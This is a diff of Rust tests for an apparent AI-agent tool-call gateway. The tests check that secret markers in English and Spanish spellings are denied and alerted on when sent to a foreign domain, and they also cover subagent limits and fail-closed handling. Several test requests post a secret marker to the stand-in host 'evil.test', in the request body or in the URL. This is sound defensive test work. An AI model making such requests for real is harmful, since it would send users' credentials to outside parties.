@@ -21,28 +21,72 @@ fn t01_a_tool_without_declaration_cannot_be_called() {
     assert_eq!((d.outcome, d.rule.as_str()), (Outcome::Deny, "S-02"));
 }
 
-// S-19: a secret marker towards a foreign domain is denied and raises an alert.
+// S-19: a secret marker towards a foreign domain is denied and raises an alert. The Spanish
+// spelling that older sessions and prompts carry is bound exactly like the English one.
 #[test]
 fn t02_a_secret_marker_to_a_foreign_domain_is_denied_and_alerts() {
+    for marker in ["{{secret:notion}}", "{{secreto:notion}}"] {
+        let env = Env::new();
+        let g = env.gateway();
+        let d = g.decide(&req(
+            "http_post",
+            json!({"url": "https://evil.test/x", "body": marker}),
+        ));
+        assert_eq!(
+            (d.outcome, d.rule.as_str()),
+            (Outcome::Deny, "S-19"),
+            "{marker}"
+        );
+        let t = g.telemetry();
+        assert_eq!(t.secret_to_foreign_destination, 1);
+        assert!(t.alerts.iter().any(|a| a.starts_with("S-19")));
+        // The same secret towards its own destination is not an S-19 deny.
+        let ok = g.decide(&req("notion_post", json!({"body": marker})));
+        assert_ne!(ok.rule, "S-19");
+        // Another tool towards Notion's domain does not borrow the binding either.
+        let other = g.decide(&req(
+            "http_post",
+            json!({"url": "https://api.notion.com/v1", "body": marker}),
+        ));
+        assert_eq!(other.rule, "S-19");
+        // A marker in the URL itself is found in either spelling.
+        let in_url = g.decide(&req(
+            "http_post",
+            json!({"url": format!("https://evil.test/{marker}"), "body": "x"}),
+        ));
+        assert_eq!(in_url.rule, "S-19", "{marker}");
+    }
+}
+
+// S-19: two spellings, and only two: nothing else that looks like a marker is one, so nothing else
+// can be filled. (Text that is not a marker is plain data and gets no S-19.)
+#[test]
+fn t02b_only_the_two_spellings_are_markers() {
     let env = Env::new();
     let g = env.gateway();
-    let d = g.decide(&req(
-        "http_post",
-        json!({"url": "https://evil.test/x", "body": "{{secreto:notion}}"}),
+    for not_one in [
+        "{{secrets:notion}}",
+        "{{Secret:notion}}",
+        "{{SECRETO:notion}}",
+        "{{ secret:notion}}",
+        "{{secret :notion}}",
+        "{secret:notion}",
+        "[secret:notion redacted]",
+        "[secreto:notion tachado]",
+    ] {
+        let d = g.decide(&req(
+            "http_post",
+            json!({"url": "https://evil.test/x", "body": not_one}),
+        ));
+        assert_ne!(d.rule, "S-19", "{not_one}");
+    }
+    assert_eq!(g.telemetry().secret_to_foreign_destination, 0);
+    // A marker nested in the other spelling: both are checked, so the request is refused.
+    let nested = g.decide(&req(
+        "notion_post",
+        json!({"body": "{{secret:{{secreto:notion}}"}),
     ));
-    assert_eq!((d.outcome, d.rule.as_str()), (Outcome::Deny, "S-19"));
-    let t = g.telemetry();
-    assert_eq!(t.secret_to_foreign_destination, 1);
-    assert!(t.alerts.iter().any(|a| a.starts_with("S-19")));
-    // The same secret towards its own destination is not an S-19 deny.
-    let ok = g.decide(&req("notion_post", json!({"body": "{{secreto:notion}}"})));
-    assert_ne!(ok.rule, "S-19");
-    // Another tool towards Notion's domain does not borrow the binding either.
-    let other = g.decide(&req(
-        "http_post",
-        json!({"url": "https://api.notion.com/v1", "body": "{{secreto:notion}}"}),
-    ));
-    assert_eq!(other.rule, "S-19");
+    assert_eq!(nested.outcome, Outcome::Deny, "{nested:?}");
 }
 
 // S-06: a tainted session sending data to a new domain asks, even with a policy that covers it.
@@ -104,8 +148,10 @@ fn t05_a_gateway_that_panics_denies() {
     }
     let env = Env::new();
     let g = env.gateway().with_secret_policy(Box::new(Boom));
-    let d = g.decide_or_deny(&req("notion_post", json!({"body": "{{secreto:notion}}"})));
-    assert_eq!((d.outcome, d.rule.as_str()), (Outcome::Deny, "fail-closed"));
+    for marker in ["{{secret:notion}}", "{{secreto:notion}}"] {
+        let d = g.decide_or_deny(&req("notion_post", json!({"body": marker})));
+        assert_eq!((d.outcome, d.rule.as_str()), (Outcome::Deny, "fail-closed"));
+    }
     // And it keeps working afterwards.
     assert_eq!(
         g.decide_or_deny(&req("read_file", json!({"path": notes(&env)})))
@@ -367,15 +413,17 @@ fn s17_subagents_only_read_and_receive_no_secrets() {
     let mut w = req("write_file", json!({"path": notes(&env)}));
     w.session.subagent = true;
     assert_eq!(g.decide(&w).rule, "S-17");
-    let mut s = req("notion_post", json!({"body": "{{secreto:notion}}"}));
-    s.session.subagent = true;
-    assert_eq!(g.decide(&s).rule, "S-17");
     let mut r = req("read_file", json!({"path": notes(&env)}));
     r.session.subagent = true;
     assert_eq!(g.decide(&r).outcome, Outcome::Allow);
-    let mut rs = r.clone();
-    rs.args.insert("path".into(), json!("{{secreto:notion}}"));
-    assert_eq!(g.decide(&rs).outcome, Outcome::Deny);
+    for marker in ["{{secret:notion}}", "{{secreto:notion}}"] {
+        let mut s = req("notion_post", json!({"body": marker}));
+        s.session.subagent = true;
+        assert_eq!(g.decide(&s).rule, "S-17");
+        let mut rs = r.clone();
+        rs.args.insert("path".into(), json!(marker));
+        assert_eq!(g.decide(&rs).outcome, Outcome::Deny);
+    }
 }
 
 // S-47: an exhausted budget is a hard stop.
